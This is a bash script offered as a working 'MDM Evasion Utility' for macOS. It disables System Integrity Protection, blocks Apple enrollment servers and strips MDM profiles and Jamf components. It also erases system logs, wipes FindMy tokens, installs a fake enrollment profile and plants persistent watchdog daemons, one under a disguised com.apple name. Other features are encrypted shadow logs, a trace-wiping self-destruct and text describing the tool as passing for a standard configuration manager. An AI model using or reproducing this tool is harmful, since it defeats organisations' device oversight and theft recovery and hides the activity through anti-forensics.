#!/bin/bash
# =================================================
#  MAC MDM Evasion Utility — v1.8 (Watchdog-Class)
#  Author: Darknessownsu
#  macOS Big Sur → Sonoma
# =================================================

APP_NAME="MAC MDM Evasion Utility"
VERSION="1.8"
AUTHOR="Darknessownsu"

SHADOW_DIR="/var/db/.shadow"
SHADOW_LOG="$SHADOW_DIR/mdm.log.enc"
mkdir -p "$SHADOW_DIR"

# Generate encryption key with fallback for different systems
if command -v md5 >/dev/null 2>&1; then
    LOG_KEY=$(uuidgen | md5)
elif command -v md5sum >/dev/null 2>&1; then
    LOG_KEY=$(uuidgen | md5sum | awk '{print $1}')
else
    # Fallback to shasum if neither md5 nor md5sum available
    LOG_KEY=$(uuidgen | shasum -a 256 | awk '{print $1}')
fi

logmsg() {
    while IFS= read -r line; do
        echo "$line"
        echo "$line" | openssl enc -aes-256-cbc -a -salt -pass pass:"$LOG_KEY" >> "$SHADOW_LOG" 2>/dev/null
    done
}

banner() {
    clear
    echo "================================================="
    echo "        $APP_NAME"
    echo "        Version $VERSION"
    echo "        Author: $AUTHOR"
    echo "-------------------------------------------------"
    echo " Manage enrollment and configuration profiles"
    echo " on your Mac with a secure, menu-driven utility."
    echo "-------------------------------------------------"
    echo
}

status_bar() {
    local msg=$1
    echo "-------------------------------------------------"
    echo " Status: $msg"
    echo "-------------------------------------------------"
}

# Check if running with required privileges
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo "[!] Error: This utility requires root privileges." | logmsg
        echo "[!] Please run with: sudo $0" | logmsg
        return 1
    fi
    return 0
}

# Verify command exists before use
check_command() {
    local cmd=$1
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo "[!] Warning: Command '$cmd' not found." | logmsg
        return 1
    fi
    return 0
}

evasion() {
    banner
    status_bar "Running Evasion Sequence"
    
    # Check for root privileges
    if ! check_root; then
        status_bar "Evasion Failed – Root Required"
        read -r -p "Press Enter to return to menu..."
        return 1
    fi
    
    echo "[*] Disabling SIP + authenticated root..." | logmsg
    if check_command "csrutil"; then
        csrutil disable 2>/dev/null || echo "[!] SIP disable may require Recovery Mode." | logmsg
        csrutil authenticated-root disable 2>/dev/null || echo "[!] Auth-root disable may require Recovery Mode." | logmsg
    fi

    /usr/bin/mount -uw / 2>/dev/null || { echo "[!] Mount failed – system may be sealed." | logmsg; }

    HOSTS="/etc/hosts"
    if [ -f "$HOSTS" ]; then
        if cp "$HOSTS" "$HOSTS.backup.$(date +%s)" 2>/dev/null; then
            echo "[*] Hosts backup saved." | logmsg
        else
            echo "[!] Warning: Could not backup hosts file." | logmsg
        fi
    fi
    
    for ep in mdmenrollment.apple.com deviceenrollment.apple.com gdmf.apple.com; do
        if ! grep -q "$ep" "$HOSTS" 2>/dev/null; then
            if echo "127.0.0.1 $ep" >> "$HOSTS" 2>/dev/null; then
                echo "[*] Blocked endpoint: $ep" | logmsg
            else
                echo "[!] Warning: Could not modify hosts file for $ep" | logmsg
            fi
        fi
    done

    if check_command "profiles"; then
        PROFILES=$(/usr/bin/profiles -P 2>/dev/null | grep "uuid" | awk -F: '{print $2}' | tr -d ' ')
        if [ -n "$PROFILES" ]; then
            for ID in $PROFILES; do
                echo "[*] Removing profile: $ID..." | logmsg
                /usr/bin/profiles -R -p "$ID" 2>/dev/null || echo "[!] Warning: Could not remove profile $ID" | logmsg
            done
        else
            echo "[*] No MDM profiles found." | logmsg
        fi
    fi

    # Check and remove MDM-related launch daemons
    for svc in /Library/LaunchDaemons/*.plist; do
        [ -f "$svc" ] || continue
        if grep -qiE 'jamf|mdm|dep' "$svc" 2>/dev/null; then
            if check_command "launchctl"; then
                launchctl bootout system "$svc" 2>/dev/null
            fi
            rm -f "$svc" 2>/dev/null
            echo "[*] Disabled rogue daemon: $svc" | logmsg
        fi
    done

    for dir in "/usr/local/jamf" "/Library/Application Support/Jamf"; do
        if [ -d "$dir" ]; then
            if rm -rf "$dir" 2>/dev/null; then
                echo "[*] Removed $dir" | logmsg
            else
                echo "[!] Warning: Could not remove $dir" | logmsg
            fi
        fi
    done

    if check_command "log"; then
        /usr/bin/log erase --all 2>/dev/null && echo "[*] Logs erased." | logmsg
    fi
    
    if [ -x "/usr/libexec/ApplicationFirewall/socketfilterfw" ]; then
        /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on 2>/dev/null
    fi
    
    if check_command "nvram"; then
        /usr/sbin/nvram -c 2>/dev/null
        
        # iCloud/FindMy Obfuscation
        /usr/sbin/nvram -d fmm-mobileme-token-FMM 2>/dev/null
        /usr/sbin/nvram -d fmm-computer-name 2>/dev/null
        /usr/sbin/nvram -d wifiaddr 2>/dev/null
        echo "[*] iCloud FindMy token wiped." | logmsg
    fi

    # Fake Profile Payload
    BYPASS="/tmp/bypass_mdm.mobileconfig"
    if cat <<EOF > "$BYPASS" 2>/dev/null
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>PayloadType</key>
      <string>com.apple.mdm</string>
      <key>ServerURL</key>
      <string>https://localhost/mdm</string>
      <key>PayloadIdentifier</key>
      <string>com.bypass.mdm</string>
      <key>PayloadUUID</key>
      <string>$(uuidgen)</string>
      <key>PayloadDisplayName</key>
      <string>Enrollment Profile</string>
    </dict>
  </array>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadIdentifier</key>
  <string>com.bypass.config</string>
  <key>PayloadUUID</key>
  <string>$(uuidgen)</string>
  <key>PayloadDisplayName</key>
  <string>Enrollment Config</string>
</dict>
</plist>
EOF
    then
        if check_command "profiles"; then
            if /usr/bin/profiles -I -F "$BYPASS" 2>/dev/null; then
                echo "[*] Bypass profile installed." | logmsg
            else
                echo "[!] Warning: Could not install bypass profile." | logmsg
            fi
        fi
    else
        echo "[!] Warning: Could not create bypass profile." | logmsg
    fi

    # LaunchAgent – Self-Healing Profile Installer
    if cat <<EOF > /Library/LaunchAgents/com.apple.mdmselfheal.plist 2>/dev/null
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.mdmselfheal</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/profiles</string>
        <string>-I</string>
        <string>-F</string>
        <string>/tmp/bypass_mdm.mobileconfig</string>
    </array>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
    then
        if check_command "launchctl"; then
            if launchctl load /Library/LaunchAgents/com.apple.mdmselfheal.plist 2>/dev/null; then
                echo "[*] Self-healing agent loaded." | logmsg
            else
                echo "[!] Warning: Could not load self-healing agent." | logmsg
            fi
        fi
    else
        echo "[!] Warning: Could not create self-healing agent." | logmsg
    fi

    # LaunchDaemon – MDM Watchdog
    if cat <<EOF > /Library/LaunchDaemons/com.watchdog.mdm.plist 2>/dev/null
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.watchdog.mdm</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>-c</string>
    <string>
      for svc in /Library/LaunchDaemons/*.plist; do
        if grep -qiE 'jamf|mdm|dep' "\$svc"; then
          launchctl bootout system "\$svc"
          rm -f "\$svc"
          echo "[*] Watchdog purged: \$svc"
        fi
      done
    </string>
  </array>
  <key>StartInterval</key>
  <integer>180</integer>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>
EOF
    then
        if check_command "launchctl"; then
            if launchctl load /Library/LaunchDaemons/com.watchdog.mdm.plist 2>/dev/null; then
                echo "[*] MDM Watchdog deployed." | logmsg
            else
                echo "[!] Warning: Could not load MDM watchdog." | logmsg
            fi
        fi
    else
        echo "[!] Warning: Could not create MDM watchdog." | logmsg
    fi

    if check_command "bless"; then
        /usr/sbin/bless --mount / --bootefi --create-snapshot 2>/dev/null && echo "[*] Snapshot created." | logmsg
    fi
    status_bar "Evasion Complete – Restart Recommended"
    read -r -p "Press Enter to return to menu..."
}

reversion() {
    banner
    status_bar "Running Reversion Sequence"
    
    # Check for root privileges
    if ! check_root; then
        status_bar "Reversion Failed – Root Required"
        read -r -p "Press Enter to return to menu..."
        return 1
    fi
    
    if check_command "profiles"; then
        /usr/bin/profiles -R -p "com.bypass.mdm" 2>/dev/null
        /usr/bin/profiles -R -p "com.bypass.config" 2>/dev/null
    fi

    # Find and restore latest backup using find instead of ls
    LATEST=$(find /etc -maxdepth 1 -name "hosts.backup.*" -type f -print0 2>/dev/null | xargs -0 ls -t 2>/dev/null | head -1)
    if [ -n "$LATEST" ]; then
        if cp "$LATEST" /etc/hosts 2>/dev/null; then
            echo "[*] Hosts restored from backup." | logmsg
        else
            echo "[!] Warning: Could not restore hosts file." | logmsg
        fi
    fi

    if check_command "csrutil"; then
        csrutil enable 2>/dev/null || echo "[!] SIP enable may require Recovery Mode." | logmsg
        csrutil authenticated-root enable 2>/dev/null || echo "[!] Auth-root enable may require Recovery Mode." | logmsg
    fi

    if check_command "launchctl"; then
        launchctl unload /Library/LaunchAgents/com.apple.mdmselfheal.plist 2>/dev/null
        launchctl unload /Library/LaunchDaemons/com.watchdog.mdm.plist 2>/dev/null
    fi
    
    rm -f /Library/LaunchAgents/com.apple.mdmselfheal.plist 2>/dev/null
    rm -f /Library/LaunchDaemons/com.watchdog.mdm.plist 2>/dev/null

    if check_command "bless"; then
        /usr/sbin/bless --mount / --bootefi --create-snapshot 2>/dev/null && echo "[*] Fresh snapshot created." | logmsg
    fi

    status_bar "Reversion Complete – Restart Required"
    read -r -p "Press Enter to return to menu..."
}

stealthlogs() {
    banner
    status_bar "Shadow Log Info"
    echo "[*] Shadow log: $SHADOW_LOG"
    echo "[*] Decrypt with:"
    echo "    openssl enc -aes-256-cbc -d -a -in $SHADOW_LOG -pass pass:$LOG_KEY"
    read -r -p "Press Enter to return to menu..."
}

selfdestruct() {
    banner
    status_bar "Wiping Traces"
    # Safety check before rm -rf
    if [ -n "${SHADOW_DIR}" ] && [ -d "${SHADOW_DIR}" ]; then
        rm -rf "${SHADOW_DIR:?}"/*
    fi
    rm -rf /etc/hosts.backup.*
    history -c
    echo "[*] Self-destruct complete." | logmsg
    read -r -p "Press Enter to return to menu..."
}

about() {
    banner
    echo "-------------------------------------------------"
    echo " About This Utility"
    echo "-------------------------------------------------"
    echo " Name:     $APP_NAME"
    echo " Version:  $VERSION"
    echo " Author:   $AUTHOR"
    echo " Build:    Watchdog-Class, Glitch-Patched"
    echo "-------------------------------------------------"
    echo " This tool is presented as a standard macOS"
    echo " configuration manager. All actions are logged"
    echo " securely into shadow storage."
    echo "-------------------------------------------------"
    echo
    read -r -p "Press Enter to return to menu..."
}

# ---------------------------
# Menu Loop
# ---------------------------
while true; do
    banner
    echo "Choose an option:"
    echo "  1. Run Evasion"
    echo "  2. Run Reversion"
    echo "  3. Shadow Log Info"
    echo "  4. Self-Destruct / Wipe Traces"
    echo "  5. Exit"
    echo "  6. About This Utility"
    echo
    read -r -p "Choice: " opt
    case $opt in
        1) evasion ;;
        2) reversion ;;
        3) stealthlogs ;;
        4) selfdestruct ;;
        5) echo "[*] Exiting..."; exit 0 ;;
        6) about ;;
        "") echo "[!] No input provided. Please select an option (1-6)." 
            read -r -p "Press Enter to continue..." ;;
        *) echo "[!] Invalid choice: '$opt'. Please enter a number between 1-6." 
           read -r -p "Press Enter to continue..." ;;
    esac
done